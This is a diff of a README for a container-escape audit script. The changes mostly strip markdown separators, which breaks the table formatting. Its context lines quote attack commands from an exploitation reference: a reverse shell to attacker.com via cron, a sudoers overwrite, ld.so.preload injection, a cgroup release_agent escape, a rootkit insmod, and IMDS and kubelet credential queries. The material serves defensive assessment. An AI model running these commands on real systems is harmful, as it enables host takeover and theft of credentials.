@@ -7,7 +7,7 @@ A bash script for detecting container escape vectors from within a running Docke
 
 > ⚠️ **For authorised security assessments only.** Do not run this script on systems you do not have explicit written permission to test.
 
----
+ 
 
 ## Overview
 
@@ -20,14 +20,14 @@ Each finding produces a structured report entry covering:
 - **Exploitability**: difficulty, required tooling, real-world precedent
 - **Recommendation**: specific remediation steps
 
----
+ 
 
 ## Checks
 
 ### Container configuration
 
 | # | Check | Severity |
-|---|-------|----------|
+| |  -|   -|
 | 1 | Privileged container (`--privileged`) | CRITICAL |
 | 2 | Dangerous Linux capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, etc.) | HIGH |
 | 3 | Host namespace sharing (PID, network, IPC, UTS, mount) | HIGH |
@@ -36,7 +36,7 @@ Each finding produces a structured report entry covering:
 ### Filesystem and mounts
 
 | # | Check | Severity |
-|---|-------|----------|
+| |  -|   -|
 | 4 | Dangerous host filesystem mounts (`/`, `/etc`, `/dev`, `/sys`, runtime sockets) | CRITICAL |
 | 5 | `/proc` filesystem exposure (core_pattern, sysrq-trigger, kcore, kmem, PID1 environ) | CRITICAL |
 | 8 | Writable cron directories | HIGH |
@@ -48,7 +48,7 @@ Each finding produces a structured report entry covering:
 ### Kernel
 
 | # | Check | Severity |
-|---|-------|----------|
+| |  -|   -|
 | 10 | `/dev/mem` access and ptrace scope | CRITICAL |
 | 12 | cgroup v1 `release_agent` escape path | CRITICAL |
 | 14 | Kernel version and CVE checks (DirtyPipe CVE-2022-0847, DirtyCOW CVE-2016-5195) | HIGH |
@@ -58,7 +58,7 @@ Each finding produces a structured report entry covering:
 ### Kubernetes and cloud
 
 | # | Check | Severity |
-|---|-------|----------|
+| |  -|   -|
 | 6 | Kubernetes service account token and RBAC permissions | HIGH–CRITICAL |
 | 7 | Environment variable secret leakage | MEDIUM |
 | 15 | Cloud instance metadata service reachable (AWS, Azure, GCP) | CRITICAL |
@@ -68,11 +68,11 @@ Each finding produces a structured report entry covering:
 ### Host access
 
 | # | Check | Severity |
-|---|-------|----------|
+| |  -|   -|
 | 18 | Namespace escape tooling present (`nsenter`, `unshare`, `runc`, `crictl`) | MEDIUM |
 | 21 | SSH private keys readable | HIGH |
 
----
+ 
 
 ## Usage
 
@@ -185,7 +185,7 @@ kubectl delete job container-escape-audit
 
 > **Note:** By default this Job runs with whatever the cluster's default security context is, which is intentional — the audit is designed to reflect the real permissions available to an unprivileged workload. If you want to test a specific security context (e.g. with a particular service account or capability set), add the relevant `securityContext` or `serviceAccountName` fields to the pod spec before applying.
 
----
+ 
 
 ## Output
 
@@ -198,13 +198,13 @@ kubectl delete job container-escape-audit
   FOR AUTHORISED SECURITY ASSESSMENTS ONLY
 ========================================================
 
---- 1. Privileged container ---
+  1. Privileged container  
 [ OK ]  Container does not appear fully privileged (CapEff=00000000a80425fb)
 
---- 4. Dangerous filesystem mounts ---
+  4. Dangerous filesystem mounts  
 [CRIT]  Container runtime socket accessible: /var/run/docker.sock
 
---- 6. Kubernetes service account ---
+  6. Kubernetes service account  
 [WARN]  Service account token readable: eyJhbGciOiJSUzI1NiIs...
 
 ==================== SUMMARY ====================
@@ -248,7 +248,7 @@ Each finding is written with full context:
     CI/CD build use cases, use rootless Docker, Kaniko, or Buildah.
     Detect socket mounts with admission controllers.
 
-  ------------------------------------------------------------
+                      
 ```
 
 ### JSON output
@@ -274,14 +274,14 @@ Each finding is written with full context:
 }
 ```
 
----
+ 
 
 ## Requirements
 
 The script requires only standard POSIX utilities present in virtually all container base images:
 
 | Tool | Required | Used for |
-|------|----------|----------|
+|  |   -|   -|
 | `bash` | Yes | Script execution |
 | `grep`, `awk`, `find`, `cat` | Yes | Core checks |
 | `curl` | Optional | IMDS and kubelet API checks |
@@ -290,18 +290,18 @@ The script requires only standard POSIX utilities present in virtually all conta
 | `ip` | Optional | Node IP detection for kubelet checks |
 | `sestatus` | Optional | SELinux status |
 
----
+ 
 
 ## Severity levels
 
 | Level | Meaning |
-|-------|---------|
+|  -|   |
 | **CRITICAL** | Immediate host escape likely with minimal effort |
 | **HIGH** | Significant risk; exploitable with moderate effort or in combination with other findings |
 | **MEDIUM** | Defence-in-depth gap; increases exploitability of other findings |
 | **INFO** | Informational; recorded for context and cross-referencing |
 
----
+ 
 
 ## Escape techniques covered
 
@@ -323,7 +323,7 @@ The script covers the following well-known container escape primitives:
 - **ld.so.preload injection**: load malicious library into SUID binary execution
 - **/dev/mem access**: read/write physical host memory
 
----
+ 
 
 ## Interpreting results
 
@@ -331,7 +331,7 @@ A single CRITICAL finding is generally sufficient for a complete host compromise
 
 The report is intended to be handed directly to a remediation team. Each recommendation references the specific Kubernetes API field, seccomp configuration, or sysctl setting needed to address the finding.
 
----
+ 
 
 ## 🔓 Container Escape & Exploitation Reference
 
@@ -339,7 +339,7 @@ The report is intended to be handed directly to a remediation team. Each recomme
 >
 > ⚠️ **Disclaimer:** For authorised security testing and defensive purposes only. Use this information solely to assess and harden your own infrastructure.
 
----
+ 
 
 <details>
 <summary><h3>Container Configuration</h3></summary>
@@ -362,12 +362,12 @@ echo '* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1' \
 
 **Remediation:** Remove `--privileged`. Use `securityContext.capabilities` to grant only the specific capabilities the workload requires.
 
----
+ 
 
 #### Check 2 — Dangerous Linux Capabilities `HIGH`
 
 | Capability | Exploit Path |
-|---|---|
+| | |
 | `CAP_SYS_ADMIN` | Mount filesystems, load kernel modules, use `ptrace` on any process |
 | `CAP_SYS_PTRACE` | Attach to any host process via `ptrace`, inject shellcode |
 | `CAP_SYS_MODULE` | Load a malicious kernel module (`insmod rootkit.ko`) |
@@ -388,7 +388,7 @@ securityContext:
     add: ["NET_BIND_SERVICE"]  # example: only add what's required
 ```
 
----
+ 
 
 #### Check 3 — Host Namespace Sharing `HIGH`
 
@@ -413,7 +413,7 @@ spec:
   hostIPC: false
 ```
 
----
+ 
 
 #### Check 11 — Seccomp / AppArmor / SELinux Disabled `MEDIUM`
 
@@ -435,7 +435,7 @@ securityContext:
 
 </details>
 
----
+ 
 
 <details>
 <summary><h3>Filesystem and Mounts</h3></summary>
@@ -464,7 +464,7 @@ volumeMounts:
     readOnly: true
 ```
 
----
+ 
 
 #### Check 5 — `/proc` Filesystem Exposure `CRITICAL`
 
@@ -482,7 +482,7 @@ echo b > /proc/sysrq-trigger
 
 **Remediation:** Use a PID namespace so `/proc` reflects only container processes. Mount `/proc/sys` read-only. Deny writes via seccomp.
 
----
+ 
 
 #### Check 8 — Writable Cron Directories `HIGH`
 
@@ -499,7 +499,7 @@ securityContext:
   readOnlyRootFilesystem: true
 ```
 
----
+ 
 
 #### Check 9 — Writable Authentication Files `CRITICAL`
 
@@ -514,7 +514,7 @@ echo 'ALL ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers
 
 **Remediation:** These files must never be writable inside a container. Use `readOnlyRootFilesystem: true`. If runtime writes are needed elsewhere, use an `emptyDir` for those specific paths only.
 
----
+ 
 
 #### Check 13 — SUID/SGID Binaries `MEDIUM`
 
@@ -533,7 +533,7 @@ find . -exec /bin/bash -p \; -quit
 RUN find / -xdev -perm /6000 -type f -exec chmod a-s {} \;
 ```
 
----
+ 
 
 #### Check 17 — Writable Dynamic Linker Config `HIGH`
 
@@ -545,7 +545,7 @@ echo '/tmp/evil_lib' > /etc/ld.so.preload
 
 **Remediation:** Use `readOnlyRootFilesystem: true`. Ensure `/etc/ld.so.preload` and `/etc/ld.so.conf.d/` are never writable inside the container.
 
----
+ 
 
 #### Check 23 — OverlayFS Upper Directory Writability `MEDIUM`
 
@@ -555,7 +555,7 @@ With access to the OverlayFS upper layer, an attacker can modify files that appe
 
 </details>
 
----
+ 
 
 <details>
 <summary><h3>Kernel</h3></summary>
@@ -572,7 +572,7 @@ dd if=/dev/mem bs=1 skip=$((0x100000)) count=1024 | strings
 
 **Remediation:** Ensure `/dev/mem` is not accessible in the container. Set `kernel.yama.ptrace_scope=1` (or higher) on all nodes. Block `ptrace` via seccomp.
 
----
+ 
 
 #### Check 12 — cgroup v1 `release_agent` Escape `CRITICAL`
 
@@ -596,12 +596,12 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 **Remediation:** Migrate to cgroup v2 (`--cgroupns=private`). Block `mount` syscalls via seccomp. Ensure containers cannot mount cgroup filesystems.
 
----
+ 
 
 #### Check 14 — Kernel CVEs `HIGH`
 
 | CVE | Kernels Affected | Impact |
-|---|---|---|
+| | | |
 | **DirtyPipe** CVE-2022-0847 | 5.8 – 5.16.11 | Overwrite read-only files (e.g. `/etc/passwd`) via the `pipe` splice mechanism |
 | **DirtyCOW** CVE-2016-5195 | < 4.8.3 | Race condition in copy-on-write allows writing to read-only memory-mapped files |
 
@@ -609,7 +609,7 @@ Public PoC code exists for both. Exploitation leads to local privilege escalatio
 
 **Remediation:** Patch the host kernel. Verify with `uname -r`. Integrate a node OS scanner (Trivy, Grype) into your CI/CD pipeline.
 
----
+ 
 
 #### Check 19 — cgroup v2 Writability `MEDIUM`
 
@@ -617,7 +617,7 @@ Writable cgroup v2 interfaces can enable resource exhaustion attacks. In certain
 
 **Remediation:** Mount cgroup2 read-only where possible. Restrict `CAP_SYS_ADMIN`, which is required for most cgroup manipulation.
 
----
+ 
 
 #### Check 22 — Kernel Module Loading `INFO`
 
@@ -632,7 +632,7 @@ insmod /tmp/rootkit.ko
 
 </details>
 
----
+ 
 
 <details>
 <summary><h3>Kubernetes and Cloud</h3></summary>
@@ -665,7 +665,7 @@ spec:
 
 Apply least-privilege RBAC. Use dedicated service accounts per workload. Audit permissions with `kubectl auth can-i --list`.
 
----
+ 
 
 #### Check 7 — Environment Variable Secret Leakage `MEDIUM`
 
@@ -679,7 +679,7 @@ cat /proc/1/environ | tr '\0' '\n'
 
 **Remediation:** Mount secrets as files rather than env vars. Better still, use an external secrets manager (HashiCorp Vault, AWS Secrets Manager, GCP Secret Manager). Rotate any exposed credentials immediately.
 
----
+ 
 
 #### Check 15 — Cloud Instance Metadata Service (IMDS) Reachable `CRITICAL`
 
@@ -702,7 +702,7 @@ curl -H "Metadata:true" \
 - **GCP/Azure:** Use Workload Identity instead of node-level credentials
 - **All:** Block IMDS access from pods via `NetworkPolicy` if containers don't require it
 
----
+ 
 
 #### Check 16 — Kubelet API Exposed Unauthenticated `CRITICAL`
 
@@ -720,7 +720,7 @@ curl http://<node-ip>:10255/pods               # full pod spec disclosure
 
 **Remediation:** Set `--anonymous-auth=false` and `--authorization-mode=Webhook` on the kubelet. Restrict access to ports 10250/10255 via firewall rules or security groups — only the control plane should reach these ports.
 
----
+ 
 
 #### Check 20 — Secret Mount Directories `HIGH`
 
@@ -748,7 +748,7 @@ volumes:
 
 </details>
 
----
+ 
 
 <details>
 <summary><h3>Host Access</h3></summary>
@@ -770,7 +770,7 @@ crictl exec -it <container-id> bash
 
 **Remediation:** Keep container images minimal — these tools should never be present in production workloads. Use distroless or scratch-based base images. Enforce image scanning in CI to catch unexpected binaries.
 
----
+ 
 
 #### Check 21 — SSH Private Keys Readable `HIGH`
 
@@ -820,7 +820,7 @@ fi
   done
 ```
 
----
+ 
 
 ## Legal
 
@@ -828,7 +828,7 @@ This tool is provided for **authorised security testing only**. Running it again
 
 There is no license attached to this project, meaning that Liam Romanis retains full rights over this project. 
 
----
+ 
 
 ## Contributing
 
@@ -841,7 +841,7 @@ Pull requests are welcome. When adding a new check, please follow the existing p
 
 Send me a request if you want to join the project...
 
----
+ 
 
 ## References
 
